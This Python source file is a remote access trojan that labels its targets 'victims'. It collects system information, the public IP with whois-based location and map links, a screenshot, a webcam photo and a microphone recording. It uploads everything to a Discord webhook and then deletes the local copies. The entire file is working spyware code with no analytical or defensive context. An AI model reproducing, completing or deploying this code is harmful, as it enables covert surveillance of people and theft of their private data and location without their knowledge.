
import platform
import socket
import os
import uuid
import psutil
import json
import requests
import threading
import time
import pyscreenshot
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import ipwhois
import webbrowser
import subprocess
import sys

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        return response.json()['ip']
    except Exception as e:
        return "Could not retrieve public IP"

def get_system_info():
    try:
        info = {}
        info["Platform"] = platform.system()
        info["Platform Release"] = platform.release()
        info["Platform Version"] = platform.version()
        info["Architecture"] = platform.machine()
        info["Hostname"] = socket.gethostname()
        info["Local IP Address"] = socket.gethostbyname(socket.gethostname())
        info["Public IP Address"] = get_public_ip()
        info["Mac Address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5,-1,-1)])
        info["Processor"] = platform.processor()
        info["RAM"] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return info
    except Exception as e:
        return {"Error": str(e)}

def get_ip_info(ip_address):
    try:
        obj = ipwhois.IPWhois(ip_address)
        results = obj.lookup_whois()
        return results
    except Exception as e:
        return {"Error": str(e)}

def create_screenshot():
    try:
        screenshot = pyscreenshot.grab()
        screenshot.save("screenshot.png")
        return "screenshot.png"
    except Exception as e:
        return None

def take_webcam_photo():
    try:
        cam = cv2.VideoCapture(0)
        result, image = cam.read()
        if result:
            cv2.imwrite("webcam_photo.png", image)
            return "webcam_photo.png"
        else:
            return None
    except Exception as e:
        return None

def record_microphone(duration=5):
    try:
        fs = 44100
        seconds = duration
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('microphone_recording.wav', fs, myrecording)
        return "microphone_recording.wav"
    except Exception as e:
        return None

def send_to_discord(webhook_url, data={}, files={}):
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")

def format_system_info(info):
    formatted_info = "**Victim Information:**\n"
    for key, value in info.items():
        formatted_info += f"**{key}:** {value}\n"
    return formatted_info

def run_rat(webhook_url, include_system_info=False, include_screenshot=False, include_webcam_photo=False, include_microphone_recording=False, recording_duration=5):
    try:
        results = {}
        if include_system_info:
            system_info = get_system_info()
            results["System Info"] = system_info
            formatted_info = format_system_info(system_info)
            
            ip_address = system_info.get("Public IP Address", None)
            if ip_address and ip_address != "Could not retrieve public IP":
                ip_info = get_ip_info(ip_address)
                results["IP Info"] = ip_info
                yandex_maps_url = f"https://yandex.ru/maps/?text={ip_info.get('network', {}).get('start_address', '')}"
                google_maps_url = f"https://www.google.com/maps?q={ip_info.get('network', {}).get('start_address', '')}"
                results["Yandex Maps"] = yandex_maps_url
                results["Google Maps"] = google_maps_url
            else:
                formatted_info += "\n**Could not retrieve IP Info.**\n"
        else:
            formatted_info = ""
        
        screenshot_path = None
        if include_screenshot:
            screenshot_path = create_screenshot()
            if screenshot_path:
                results["Screenshot"] = "Captured"
                formatted_info += "\n**Screenshot Captured.**\n"

        webcam_photo_path = None
        if include_webcam_photo:
            webcam_photo_path = take_webcam_photo()
            if webcam_photo_path:
                results["Webcam Photo"] = "Captured"
                formatted_info += "\n**Webcam Photo Captured.**\n"

        microphone_recording_path = None
        if include_microphone_recording:
            microphone_recording_path = record_microphone(recording_duration)
            if microphone_recording_path:
                results["Microphone Recording"] = "Recorded"
                formatted_info += "\n**Microphone Recording Recorded.**\n"

        data = {}
        files = {}

        if results:
            data["content"] = formatted_info
        
        if screenshot_path:
            files["screenshot.png"] = open(screenshot_path, "rb")
        if webcam_photo_path:
            files["webcam_photo.png"] = open(webcam_photo_path, "rb")
        if microphone_recording_path:
            files["microphone_recording.wav"] = open(microphone_recording_path, "rb")

        send_to_discord(webhook_url, data=data, files=files)

        if screenshot_path:
            os.remove(screenshot_path)
        if webcam_photo_path:
            os.remove(webcam_photo_path)
        if microphone_recording_path:
            os.remove(microphone_recording_path)

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    run_rat(webhook_url='', include_system_info=False, include_screenshot=False, include_webcam_photo=False, include_microphone_recording=False, recording_duration=5)
